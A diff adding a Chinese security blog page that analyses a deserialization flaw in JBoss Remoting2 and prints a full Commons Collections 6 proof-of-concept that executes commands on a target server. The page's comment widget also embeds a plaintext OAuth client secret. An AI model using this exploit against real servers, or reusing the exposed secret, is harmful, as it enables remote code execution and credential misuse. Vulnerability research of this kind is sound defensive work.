@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>JBoss remoting2协议及其反序列化分析 - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="JBoss remoting2协议及其反序列化分析 | P1ay2win's blog">
+<meta property="og:image" content="http://127.0.0.1/2022/06/02/JBoss remoting2协议及其反序列化分析/">
+<meta property="twitter:image" content="http://127.0.0.1/2022/06/02/JBoss remoting2协议及其反序列化分析/">
+
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="JBoss remoting2协议及其反序列化分析" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="JBoss remoting2协议及其反序列化分析" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2022-06-02T03:30:53.000Z">2022-06-02</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/代码审计/">代码审计</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    12 分钟 读完 (大约 1775 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                JBoss remoting2协议及其反序列化分析
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间读了<a href="https://twitter.com/y4er_chabug" target="_blank" rel="noopener">@Y4ar</a>师傅分析JBoss的文章和《A little bit beyong \xAC\xED》的原文，起初简单的看下，以为是普通的反序列漏洞，后面经过分析才察觉是关于JBoss的<strong>Remoting2协议</strong>的漏洞。本文以JBoss AS 6.1.0.Final为例，主要分析与<a href="https://twitter.com/y4er_chabug" target="_blank" rel="noopener">@Y4ar</a>师傅稍有不同的一种反序列化触发方式。</p>
+<a id="more"></a>
+<h2 id="Remoting2协议"><a href="#Remoting2协议" class="headerlink" title="Remoting2协议"></a>Remoting2协议</h2><p>Remoting服务端的框架如下图所示，在接受收到从网络传输过来的数据后，数据会由<code>UnMarshaller</code>转换调用请求对象，传送到<code>ServerInvoker</code>，再由其根据调用请求对象的信息传送到相应的调用实现类<code>InvocationHandler</code>。</p>
+<p><code>InvocationHandler</code>执行完的返回结果，会经由<code>ServerInvoker</code>传到<code>Marshaller</code>，再由<code>Marshaller</code>转换为网络中传输的数据，传回给调用的客户端。</p>
+<p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/design_server.jpg" alt></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从粗略浏览文章获取到的信息来看，漏洞存在于3873和4446端口。那么直接下断点在<code>ServerSocket</code>，往前回溯几层，可以看到分别是由<code>org.jboss.remoting.transport.Connector#start</code>方法和<code>org.jboss.remoting.transport.socket.SocketServerInvoker#start</code>开启的监听端口。在<code>SocketServerInvoker</code>对象中的<code>props</code>属性可以看到自定义的编码、解码工具类：<code>InvocationMarshaller</code>和<code>InvocationUnMarshaller</code>。</p>
+<p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-24 190456.png" alt="屏幕截图 2022-05-24 190456"></p>
+<p>在后端框架中<code>Connector</code>充当着管理<code>ServerInvoker</code>的角色，并为<code>ServerInvoker</code>添加<code>InvocationHandler</code>，其<code>addInvocationHandler</code>就是用来实现该功能的。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> ServerInvocationHandler <span class="hljs-title">addInvocationHandler</span><span class="hljs-params">(String subsystem, <span class="hljs-keyword">final</span> ServerInvocationHandler handler)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.invoker == <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">"You may only add handlers once the Connector is created (via create() method)."</span>);</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">                handler.setMBeanServer(Connector.<span class="hljs-keyword">this</span>.server);</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.invoker.addInvocationHandler(subsystem, handler);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用于供Remotoing客户端调用的<code>ServerInvocationHandler</code>实现类众多，包括各种各样协议和使用场景。</p>
+<p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-24 193836.png" alt></p>
+<p>基于<code>Connector</code>的功能，我们在其<code>addInvocationHandler</code>方法处下断点，可以得出JBoss所使用到的<code>InvocationHandler</code>。在默认配置下，实测只会使用到以下五个<code>ServerInvocationHandler</code>。其中<code>AOPRemotingInvocationHandler</code>类配置在3873端口，其余四个配置在4446端口。</p>
+<ul>
+<li>org.jboss.profileservice.remoting.ProfileServiceInvocationHandler</li>
+<li>org.jboss.aspects.remoting.AOPRemotingInvocationHandler</li>
+<li>org.jboss.profileservice.management.upload.remoting.DeployHandler</li>
+<li>org.jboss.invocation.unified.server.UnifiedInvoker</li>
+<li>org.jboss.deployment.remoting.DeployHandler</li>
+</ul>
+<p>从网上找到一个客户端的Demo代码，没有设置<code>subsystem</code>名称，默认就进到了4446端口下的第一个<code>InvocationHandler</code>。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="hljs-keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="hljs-keyword">import</span> org.jboss.remoting.Client;  </span><br><span class="line"><span class="hljs-keyword">import</span> org.jboss.remoting.InvokerLocator;  </span><br><span class="line">  </span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClientTest</span> </span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;  </span><br><span class="line">        String locatorURI = <span class="hljs-string">"socket://192.168.78.132:4446"</span>;  </span><br><span class="line">        String params = <span class="hljs-string">"/?backlog=50&amp;numAcceptThreads=30&amp;maxPoolSize=30&amp;clientMaxPoolSize=30&amp;clientLeasePeriod=10000&amp;timeout=8000"</span>;  </span><br><span class="line">        locatorURI += params;  </span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;  </span><br><span class="line">            InvokerLocator locator = <span class="hljs-keyword">new</span> InvokerLocator(locatorURI);  </span><br><span class="line">            Client client = <span class="hljs-keyword">new</span> Client(locator,ServerHandle.class.getName());  </span><br><span class="line">            client.connect();  </span><br><span class="line">            client.invoke(<span class="hljs-string">"jhb "</span>,<span class="hljs-keyword">new</span> HashMap&lt;String,String&gt;());  </span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (MalformedURLException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进到<code>org.jboss.deployment.remoting.DeployHandler#invoke</code>方法，其逻辑是从<code>InvocationRequest</code>获取参数和载荷，再根据参数值调用相应的方法。其中参数的值就是客户端中调用<code>invoke</code>方法传的值。</p>
+<p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-24 204600.png" alt></p>
+<p>来到<code>InvocationRequest</code>的定义处，它实现了<code>Serializable</code>，并且<code>getParameter</code>和<code>getRequestPayload</code>方法获取到的属性的类型分别为<code>Object</code>和<code>Map</code>。</p>
+<p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-30 151243.png" alt></p>
+<p>这里直接在调用<code>Client</code>的<code>invoke</code>方法时，<code>param</code>或<code>matedata</code>参数传入CC6的对象，即可触发反序列化漏洞。在调用栈中从自定义的解码工具类<code>InvocationUnMarshaller</code>开始，中间没有反序列化类黑白名单等防护措施，一路来到<code>ObjectInputStream</code>的<code>readObject</code>方法反序列化还原CC6对象。</p>
+<p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-30 153557.png" alt></p>
+<p>另一个存在漏洞的端口3873，调用栈中反序列化是从<code>SerializableUnMatshaller</code>开始，但最终过程是一样的。</p>
+<p>最终完整POC如下：</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SimpleClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        makeInvocation(<span class="hljs-string">"socket://192.168.78.155:4446/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">makeInvocation</span><span class="hljs-params">(String locatorURI)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        InvokerLocator locator = <span class="hljs-keyword">new</span> InvokerLocator(locatorURI);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Calling remoting server with locator uri of: "</span> + locatorURI);</span><br><span class="line"></span><br><span class="line">        Client remotingClient = <span class="hljs-keyword">new</span> Client(locator);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String,Object&gt; mateMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        mateMap.put(<span class="hljs-string">"test"</span>,ApacheCommonsCollections6.getObject());</span><br><span class="line">        remotingClient.connect();</span><br><span class="line">        remotingClient.invoke(mateMap);</span><br><span class="line">        remotingClient.invoke(<span class="hljs-string">"jhb "</span>,mateMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApacheCommonsCollections6</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] realChain = <span class="hljs-keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"getMethod"</span>, <span class="hljs-keyword">new</span> Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;</span><br><span class="line">                        <span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> Class[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;</span><br><span class="line">                        <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"exec"</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">"whoami"</span>&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="hljs-keyword">new</span> ChainedTransformer(realChain);</span><br><span class="line">        Map innermap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Map outermap = LazyMap.decorate(innermap, chain);</span><br><span class="line">        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outermap, <span class="hljs-string">"mykey"</span>);</span><br><span class="line">        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);</span><br><span class="line">        hs.add(<span class="hljs-string">"diggid"</span>);</span><br><span class="line">        Field mapField = Class.forName(<span class="hljs-string">"java.util.HashSet"</span>).getDeclaredField(<span class="hljs-string">"map"</span>);</span><br><span class="line">        mapField.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        HashMap hm = (HashMap) mapField.get(hs);</span><br><span class="line">        Field tableField = Class.forName(<span class="hljs-string">"java.util.HashMap"</span>).getDeclaredField(<span class="hljs-string">"table"</span>);</span><br><span class="line">        tableField.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        Object[] tableArray = (Object[]) tableField.get(hm);</span><br><span class="line">        Object table = tableArray[<span class="hljs-number">0</span>];</span><br><span class="line">        Field key = table.getClass().getDeclaredField(<span class="hljs-string">"key"</span>);</span><br><span class="line">        key.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        key.set(table, tme);</span><br><span class="line">        <span class="hljs-keyword">return</span> hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="随便看看"><a href="#随便看看" class="headerlink" title="随便看看"></a>随便看看</h2><p>前面有说到remoting2除了socket外，还支持其他一些协议，但默认模式下基于socket协议的remoting2协议被用到。不过其中的<code>WebInvoctonHandler</code>还是挺吸引人的。看了JBoss的文档，发现有关于这个InvocationHandler的介绍，它可以通过http协议进行反序列化。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SimpleClient</span> </span>&#123;</span><br><span class="line">    <span class="hljs-comment">// Default locator values</span></span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String transport = <span class="hljs-string">"http"</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String host = <span class="hljs-string">"localhost"</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> port = <span class="hljs-number">5400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">makeInvocation</span><span class="hljs-params">(String locatorURI)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="hljs-comment">// create InvokerLocator with the url type string</span></span><br><span class="line">        <span class="hljs-comment">// indicating the target remoting server to call upon.</span></span><br><span class="line">        InvokerLocator locator = <span class="hljs-keyword">new</span> InvokerLocator(locatorURI);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Calling remoting server with locator uri of: "</span> + locatorURI);</span><br><span class="line"></span><br><span class="line">        Client remotingClient = <span class="hljs-keyword">new</span> Client(locator);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// make invocation on remoting server and send complex data object</span></span><br><span class="line">        <span class="hljs-comment">// by default, the remoting http client invoker will use method type of POST,</span></span><br><span class="line">        <span class="hljs-comment">// which is needed when ever sending objects to the server.  So no metadata map needs</span></span><br><span class="line">        <span class="hljs-comment">// to be passed to the invoke() method.</span></span><br><span class="line">        Object response = remotingClient.invoke(<span class="hljs-keyword">new</span> ComplexObject(<span class="hljs-number">2</span>, <span class="hljs-string">"foo"</span>, <span class="hljs-keyword">true</span>), <span class="hljs-keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="hljs-string">"\nResponse from remoting http server when making http POST request and sending a complex data object:\n"</span> + response);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map metadata = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        <span class="hljs-comment">// set the metadata so remoting client knows to use http GET method type</span></span><br><span class="line">        metadata.put(<span class="hljs-string">"TYPE"</span>, <span class="hljs-string">"GET"</span>);</span><br><span class="line">        <span class="hljs-comment">// not actually sending any data to the remoting server, just want to get its response</span></span><br><span class="line">        response = remotingClient.invoke((Object) <span class="hljs-keyword">null</span>, metadata);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="hljs-string">"\nResponse from remoting http server when making GET request:\n"</span> + response);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// now set type back to POST and send a plain text based request</span></span><br><span class="line">        metadata.put(<span class="hljs-string">"TYPE"</span>, <span class="hljs-string">"POST"</span>);</span><br><span class="line">        response = remotingClient.invoke(WebInvocationHandler.STRING_RETURN_PARAM, metadata);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="hljs-string">"\nResponse from remoting http server when making http POST request and sending a text based request:\n"</span> + response);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// notice are getting custom response code and message set by web invocation handler</span></span><br><span class="line">        Integer responseCode = (Integer) metadata.get(HTTPMetadataConstants.RESPONSE_CODE);</span><br><span class="line">        String responseMessage = (String) metadata.get(HTTPMetadataConstants.RESPONSE_CODE_MESSAGE);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Response code from server: "</span> + responseCode);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Response message from server: "</span> + responseMessage);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>虽然在JBoss这里用到<code>WebInvoctonHandler</code>，但是根据JBoss的Demo配置文件给出的路径<code>/servlet-invoker/ServerInvokerServlet</code>，可以查到基于JBoss开发的JBoss Operations Network存在关于<code>WebInvoctonHandler</code>的漏洞，CVE编号为CVE-2016-3737。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了JBoss其他反序列化漏洞、4446和3873这两个端口漏洞，感觉JBoss就像个筛子，特别是Remoting这个协议。后面在JBoss EAP 6.x和JBoss/Wildfly AS 7.x及往后版本，JBoss/Wildfly已默认不使用remoting2协议，而是使用了引入身份认证机制的remoting3协议。感觉remoting3协议可分析看看也没有什么漏洞，但最坑的是这么多年过去了，remoting3竟然连份文档都没有。。。</p>
+<p>文中若有什么错误的地方，恳请各位师傅斧正。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://docs.jboss.org/jbossremoting/2.5.4.SP5/guide/html_single/" target="_blank" rel="noopener">https://docs.jboss.org/jbossremoting/2.5.4.SP5/guide/html_single/</a></p>
+<p><a href="https://docs.jboss.org/jbossremoting/2.5.4.SP5/userguide/html_single/" target="_blank" rel="noopener">https://docs.jboss.org/jbossremoting/2.5.4.SP5/userguide/html_single/</a></p>
+<p><a href="https://y4er.com/post/jboss-4446-rce-and-rpc-echo-response/" target="_blank" rel="noopener">https://y4er.com/post/jboss-4446-rce-and-rpc-echo-response/</a></p>
+<p><a href="https://www.tenable.com/security/research/tra-2016-22" target="_blank" rel="noopener">https://www.tenable.com/security/research/tra-2016-22</a></p>
+
+        </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="http://127.0.0.1/2022/06/02/JBoss remoting2协议及其反序列化分析/">JBoss remoting2协议及其反序列化分析</a></li>
+            <li><strong>本文作者：</strong><a href="http://127.0.0.1">P1ay2win</a></li>
+            <li><strong>本文链接：</strong><a href="http://127.0.0.1/2022/06/02/JBoss remoting2协议及其反序列化分析/">http://127.0.0.1/2022/06/02/JBoss remoting2协议及其反序列化分析/</a></li>
+            <li><strong>发布时间：</strong>2022-06-02</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/JBoss/">JBoss</a>, <a class="has-link-grey -link" href="/tags/remoting/">remoting</a>, <a class="has-link-grey -link" href="/tags/反序列化/">反序列化</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2022/04/25/惊回晓梦忆秋娟/">
+                <span class="level-item">惊回晓梦忆秋娟</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '372fb49f2243341bf93b',
+        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
+        id: '82c286f110ed12e06ca708837d38cd5f',
+        repo: 'p1ay2win.github.io',
+        owner: 'p1ay2win',
+        admin: "p1ay2win",
+        createIssueManually: false,
+        distractionFreeMode: false
+    })
+    gitalk.render('comment-container')
+</script>
+
+
+    </div>
+</div>
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        p1ay2win
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        他们的爱与风华，只问自由，只问盛放，只问深情，只问初心，只问勇敢，无问西东。
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>CN</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        37
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
